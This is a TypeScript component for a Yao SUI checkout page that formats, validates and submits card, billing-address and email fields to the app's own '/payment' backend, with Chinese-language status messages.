import { Component, EventData, $Backend } from '@yao/sui';

const self = this as Component;

interface PaymentForm {
  email: string;
  cardNumber: string;
  expiry: string;
  cvc: string;
  cardholderName: string;
  country: string;
  state: string;
  address1: string;
  address2: string;
  securityAgreement: boolean;
  isValid: boolean;
}

interface CardType {
  name: string;
  pattern: string;
  icon: string;
  cvcLength: number;
}

// Initialize form data
const formData: PaymentForm = {
  email: 'quasia66@wwsheng.xyz',
  cardNumber: '',
  expiry: '',
  cvc: '',
  cardholderName: '',
  country: 'HK',
  state: '',
  address1: '',
  address2: '',
  securityAgreement: false,
  isValid: false
};

let currentCardType: CardType | null = null;
let isProcessing = false;

// Email input handler
self.handleEmailInput = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  formData.email = input.value.trim();
  validateForm();
};

// Card number input handler
self.handleCardNumberInput = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  let value = input.value.replace(/\D/g, ''); // Remove non-digits
  
  // Format card number with spaces
  value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
  
  // Limit to 19 characters (16 digits + 3 spaces)
  if (value.length > 19) {
    value = value.substring(0, 19);
  }
  
  input.value = value;
  formData.cardNumber = value.replace(/\s/g, ''); // Store without spaces
  
  // Detect card type
  detectCardType(formData.cardNumber);
  
  validateForm();
};

// Expiry date input handler
self.handleExpiryInput = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  let value = input.value.replace(/\D/g, ''); // Remove non-digits
  
  // Format as MM/YY
  if (value.length >= 2) {
    value = value.substring(0, 2) + '/' + value.substring(2, 4);
  }
  
  input.value = value;
  formData.expiry = value;
  
  validateForm();
};

// CVC input handler
self.handleCvcInput = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  let value = input.value.replace(/\D/g, ''); // Remove non-digits
  
  // Limit CVC length based on card type
  const maxLength = currentCardType?.cvcLength || 4;
  if (value.length > maxLength) {
    value = value.substring(0, maxLength);
  }
  
  input.value = value;
  formData.cvc = value;
  
  validateForm();
};

// Cardholder name input handler
self.handleCardholderNameInput = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  formData.cardholderName = input.value.trim();
  validateForm();
};

// Country change handler
self.handleCountryChange = async (event: Event) => {
  const select = event.target as HTMLSelectElement;
  formData.country = select.value;
  formData.state = ''; // Reset state when country changes
  
  // Update state dropdown options
  updateStateOptions(formData.country);
  
  validateForm();
};

// State change handler
self.handleStateChange = async (event: Event) => {
  const select = event.target as HTMLSelectElement;
  formData.state = select.value;
  validateForm();
};

// Address line 1 input handler
self.handleAddress1Input = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  formData.address1 = input.value.trim();
  validateForm();
};

// Address line 2 input handler
self.handleAddress2Input = async (event: Event) => {
  const input = event.target as HTMLInputElement;
  formData.address2 = input.value.trim();
  validateForm();
};

// Security agreement checkbox handler
self.handleSecurityAgreementChange = async (event: Event) => {
  const checkbox = event.target as HTMLInputElement;
  formData.securityAgreement = checkbox.checked;
  validateForm();
};

// Submit form handler
self.handleSubmit = async () => {
  if (isProcessing || !formData.isValid) {
    return;
  }
  
  isProcessing = true;
  
  try {
    // Show loading state
    const submitButton = document.getElementById('submitButton') as HTMLButtonElement;
    if (submitButton) {
      submitButton.classList.add('relative', 'text-transparent');
      submitButton.disabled = true;

      // Add loading spinner
      const spinner = document.createElement('div');
      spinner.className = 'absolute inset-0 flex items-center justify-center';
      spinner.innerHTML = '<div class="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>';
      spinner.id = 'loading-spinner';
      submitButton.appendChild(spinner);
    }
    
    // Call backend to process payment
    const response = await $Backend('/payment').Call('ProcessPayment', formData);
    
    if (response.success) {
      // Show success message
      showMessage('success', response.message || '支付信息已成功保存！');
      
      // Redirect after delay
      setTimeout(() => {
        window.location.href = response.redirectUrl || '/';
      }, 2000);
    } else {
      showMessage('error', response.message || '处理支付信息时出现错误，请重试。');
    }
  } catch (error) {
    console.error('Payment processing error:', error);
    showMessage('error', '网络连接错误，请检查您的网络连接');
  } finally {
    isProcessing = false;
    
    // Remove loading state
    const submitButton = document.getElementById('submitButton') as HTMLButtonElement;
    if (submitButton) {
      submitButton.classList.remove('relative', 'text-transparent');
      submitButton.disabled = !formData.isValid;

      // Remove loading spinner
      const spinner = document.getElementById('loading-spinner');
      if (spinner) {
        spinner.remove();
      }
    }
  }
};

// Detect card type based on card number
function detectCardType(cardNumber: string) {
  const cardTypes = self.store.GetJSON('card_types') || [];

  currentCardType = null;

  for (const cardType of cardTypes) {
    const regex = new RegExp(cardType.pattern);
    if (regex.test(cardNumber)) {
      currentCardType = cardType;
      break;
    }
  }

  // Update card type icons
  updateCardTypeIcons();
}

// Update card type icons display
function updateCardTypeIcons() {
  const cardIcons = document.querySelectorAll('.card-icons img');
  cardIcons.forEach(icon => {
    icon.classList.remove('active');
    if (currentCardType && icon.getAttribute('alt')?.toLowerCase().includes(currentCardType.name)) {
      icon.classList.add('active');
    }
  });
}

// Update state dropdown options based on selected country
function updateStateOptions(countryCode: string) {
  const countries = self.store.GetJSON('countries') || [];
  const country = countries.find((c: any) => c.code === countryCode);

  const stateSelect = document.getElementById('state') as HTMLSelectElement;
  if (stateSelect && country) {
    // Clear existing options
    stateSelect.innerHTML = '<option value="" disabled selected>地区</option>';

    // Add new options
    country.states.forEach((state: any) => {
      const option = document.createElement('option');
      option.value = state.code;
      option.textContent = state.name;
      stateSelect.appendChild(option);
    });
  }
}

// Validate entire form
function validateForm() {
  const validation = self.store.GetJSON('validation') || {};

  let isValid = true;

  // Validate email
  if (!validateField('email', formData.email, validation.email)) {
    isValid = false;
  }

  // Validate card number
  if (!validateField('cardNumber', formData.cardNumber, validation.cardNumber)) {
    isValid = false;
  }

  // Validate expiry
  if (!validateField('expiry', formData.expiry, validation.expiry)) {
    isValid = false;
  }

  // Validate CVC
  if (!validateField('cvc', formData.cvc, validation.cvc)) {
    isValid = false;
  }

  // Validate cardholder name
  if (!validateField('cardholderName', formData.cardholderName, validation.cardholderName)) {
    isValid = false;
  }

  // Validate country
  if (!validateField('country', formData.country, validation.country)) {
    isValid = false;
  }

  // Validate address
  if (!validateField('address1', formData.address1, validation.address1)) {
    isValid = false;
  }

  // Validate security agreement
  if (!formData.securityAgreement) {
    isValid = false;
  }

  formData.isValid = isValid;

  // Update submit button state
  const submitButton = document.querySelector('button[s\\:on-click="handleSubmit"]') as HTMLButtonElement;
  if (submitButton) {
    submitButton.disabled = !isValid;
    // The disabled styles are already handled by Tailwind CSS classes in the HTML
  }
}

// Validate individual field
function validateField(fieldName: string, value: string | boolean, rules: any): boolean {
  if (!rules) return true;
  
  const element = document.getElementById(fieldName) as HTMLInputElement;
  
  // Required validation
  if (rules.required && (!value || (typeof value === 'string' && value.trim() === ''))) {
    setFieldError(element, rules.message);
    return false;
  }
  
  // Pattern validation
  if (rules.pattern && typeof value === 'string') {
    const regex = new RegExp(rules.pattern);
    if (!regex.test(value)) {
      setFieldError(element, rules.message);
      return false;
    }
  }
  
  // Length validation
  if (typeof value === 'string') {
    if (rules.minLength && value.length < rules.minLength) {
      setFieldError(element, rules.message);
      return false;
    }
    
    if (rules.maxLength && value.length > rules.maxLength) {
      setFieldError(element, rules.message);
      return false;
    }
  }
  
  // Clear error if validation passes
  clearFieldError(element);
  return true;
}

// Set field error state
function setFieldError(element: HTMLInputElement | null, message: string) {
  if (!element) return;
  
  element.classList.add('input-error');
  element.classList.remove('input-success');
  
  // Show error message
  let errorElement = element.parentElement?.querySelector('.error-message') as HTMLElement;
  if (!errorElement) {
    errorElement = document.createElement('div');
    errorElement.className = 'error-message';
    element.parentElement?.appendChild(errorElement);
  }
  errorElement.textContent = message;
}

// Clear field error state
function clearFieldError(element: HTMLInputElement | null) {
  if (!element) return;
  
  element.classList.remove('input-error');
  element.classList.add('input-success');
  
  // Remove error message
  const errorElement = element.parentElement?.querySelector('.error-message');
  if (errorElement) {
    errorElement.remove();
  }
}

// Show success/error message
function showMessage(type: 'success' | 'error', message: string) {
  // Create message element
  const messageElement = document.createElement('div');
  messageElement.className = `fixed top-4 right-4 p-4 rounded-md shadow-lg z-50 ${
    type === 'success' ? 'bg-green-500 text-white' : 'bg-red-500 text-white'
  }`;
  messageElement.textContent = message;
  
  document.body.appendChild(messageElement);
  
  // Remove message after 5 seconds
  setTimeout(() => {
    messageElement.remove();
  }, 5000);
}
